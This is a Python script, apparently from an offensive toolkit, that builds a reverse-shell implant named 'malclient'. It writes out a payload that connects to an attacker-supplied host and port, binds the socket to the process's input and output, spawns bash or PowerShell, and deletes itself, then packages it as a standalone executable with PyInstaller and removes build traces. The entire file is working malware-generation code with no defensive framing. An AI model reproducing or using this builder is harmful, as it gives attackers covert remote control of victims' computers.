import os, subprocess, shutil

# Function to delete the files and directories
def remove_paths(paths):
    print("[*] Performing Clean-Up. . .")
    for path in paths:
        if os.path.isdir(path): # If it's a directory
            try:
                shutil.rmtree(path) # Remove the entire directory and its contents
            except Exception:
                continue
        elif os.path.isfile(path): # If it's a file
            try:
                os.remove(path) # Remove the file
            except Exception:
                continue
        else:
            continue

def MoveExecutable(osTarget:str, unixPorts):
    if osTarget.lower() not in unixPorts:
        shutil.move("dist/malclient.exe", ".")
        print("[+] Created malclient.exe! (Windows Executable)")
    else:
        shutil.move("dist/malclient", ".")
        print("[+] Created malclient! (Unix Executable)")

def CreateScript(lhost:str,lport:str,osTarget:str):
    # create target lists
    unixPorts = ["unix", "linux"]
    winPorts = ["windows", "win", "nt"]

    # create mass list
    validTargets = unixPorts + winPorts

    if osTarget.lower() not in validTargets:
        print(f"[-] {osTarget.lower()} is not a valid target OS")
        return False
    
    shellType = ""
    if osTarget.lower() not in unixPorts:
        shellType = "powershell.exe"
    else:
        shellType = "/bin/bash"
    
    # Executable will create a reverse shell connection via pty
    baseScript = f"""import socket, subprocess, os, sys, pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((\"{lhost}\",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(\"{shellType}\")
os.remove(sys.argv[0])
"""
    with open('malclient.py', 'w') as MalScript:
        MalScript.write(baseScript)

    print(f"[+] Created malclient.py")
    print("[*] Building portable executable. . .")

    # run a system command to run pyinstaller
    buildcmd = 'pyinstaller --log-level=WARN --onefile malclient.py'
    
    subprocess.run(buildcmd, shell=True)
    remove_paths(['__pycache__', 'build', 'dist', 'malclient', 'malclient.exe', 'malclient.spec'])
    MoveExecutable(osTarget,unixPorts)

    return True